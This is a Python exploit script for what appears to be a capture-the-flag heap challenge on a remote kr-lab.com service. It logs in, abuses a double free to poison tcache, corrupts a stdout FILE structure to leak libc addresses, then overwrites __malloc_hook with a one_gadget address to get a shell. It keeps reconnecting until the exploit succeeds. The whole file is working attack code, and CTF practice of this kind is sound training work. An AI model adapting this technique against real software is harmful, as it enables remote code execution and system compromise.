#!/usr/bin/env python
from mypwn import *
context.arch='amd64'
# context.log_level='debug'
# p=remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)


def debugf(payload=''):
    gdb.attach(p,payload)

def login(username,psw):
    ru(':')
    sd(username)
    ru(':')
    sd(psw)


def menu(i):
    ru('>\n')
    sl(str(i))

def add(size=0x60,des='b'*60,name='a'*0x10):
    menu(1)
    ru(':')
    sd(name)
    ru(':')
    sd(str(size))
    ru(':')
    sd(des)

def delete(index):
    menu(2)
    ru(':')
    sl(str(index))
def exit():
    menu(3)
def exp():
    login('admin\n','frame\n')
    # debugf()
    add(0x60)             # 0
    delete(0)
    delete(0)
    delete(0)
    # delete(0)
    # delete(0)
    # delete(0)
    # delete(0)

    add(0x60,'\x80\x34')  # 1
    add(0x60)             # 2
    # debugf()
    add(0x60,'\x60\x87')  # 3 can not free


    delete(0)
    delete(0)
    delete(0)
    delete(0)

    add(0x70)          # 4
    delete(4)
    delete(4)
    delete(4)

    # delete(3)
    add(0x70,p64(0x602060))

    add(0x70)
    add(0x70,'\x00'*0x70)

    add(0x60,'\x80\x34')   # 0
    add(0x60,'\x00')       # 1
    add(0x60,'\x00')       # 2
    payload=ioleak(0xfbad2887)
    add(0x60,payload)     # libc
    line=ru('>')
    libc_base=u64(line[8:16])-0x3ed8b0
    # print('====================================')
    # print(line)
    print(hex(libc_base))
    pause()
    one_off=0x4f2c5
    one_off=0x4f322
    one_off=0x10a38c
    one=libc_base+one_off
    malloc_hook=libc_base+0x3ebc30
    # debugf()
    sl('2')
    ru(':')
    sl('0')
    delete(0)
    delete(0)
    add(0x60,p64(malloc_hook))
    add(0x60,'0')
    add(0x60,p64(one))
    menu(1)
    p.interactive()




while(1):
    try:
        p=remote('90b826377a05d5e9508314e76f2f1e4e.kr-lab.com',40001)
        exp()
        break   
    except:
        p.close()
        continue

